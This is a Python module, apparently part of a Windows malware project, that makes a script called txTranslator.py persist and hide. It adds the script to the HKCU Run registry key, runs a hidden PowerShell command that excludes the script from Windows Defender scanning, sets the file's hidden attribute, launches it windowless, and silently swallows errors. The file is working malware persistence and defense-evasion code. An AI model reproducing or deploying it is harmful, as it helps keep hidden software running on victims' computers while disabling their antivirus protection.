import os
import sys
import winreg as reg
from ctypes import windll
from subprocess import Popen, CREATE_NEW_CONSOLE, SW_HIDE
from helper.helpers.config import AutostartConfig

class Autostart:
    """
    Adds the Python script to autostart.
    """
    def __init__(self):
        self.__config = AutostartConfig()
        self.__python_script_path = os.path.abspath(os.path.join(os.path.dirname(__file__), '../modules/txTranslator.py'))
        self.__autostart_name = self.__config.AutostartName

    def __add_to_autostart_registry(self) -> None:
        """
        Adds the Python script to Windows registry for autostart.

        Parameters:
        - None.

        Returns:
        - None.
        """
        try:
            key = r"Software\Microsoft\Windows\CurrentVersion\Run"
            value = f'"{sys.executable.replace("python.exe", "pythonw.exe")}" "{self.__python_script_path}"'
            with reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_SET_VALUE) as reg_key:
                reg.SetValueEx(reg_key, self.__autostart_name, 0, reg.REG_SZ, value)
        except Exception as e:
            pass

    def __exclude_from_defender(self) -> None:
        """
        Trying to exclude the Python script from Windows Defender checks.

        Parameters:
        - None.

        Returns:
        - None.
        """
        Popen(
            f"powershell -Command Add-MpPreference -ExclusionPath '{self.__python_script_path}'",
            shell=True,
            creationflags=CREATE_NEW_CONSOLE | SW_HIDE
        )

    def __hide_file(self) -> None:
        """
        Makes the Python script hidden.

        Parameters:
        - None.

        Returns:
        - None.
        """
        windll.kernel32.SetFileAttributesW(self.__python_script_path, 2)

    def run(self) -> None:
        """
        Launches the autostart module.

        Parameters:
        - None.

        Returns:
        - None.
        """
        try:
            self.__add_to_autostart_registry()
            self.__exclude_from_defender()
            self.__hide_file()

            Popen(
                f'"{sys.executable.replace("python.exe", "pythonw.exe")}" "{self.__python_script_path}"',
                shell=True,
                creationflags=CREATE_NEW_CONSOLE
            )
        except Exception as e:
            pass
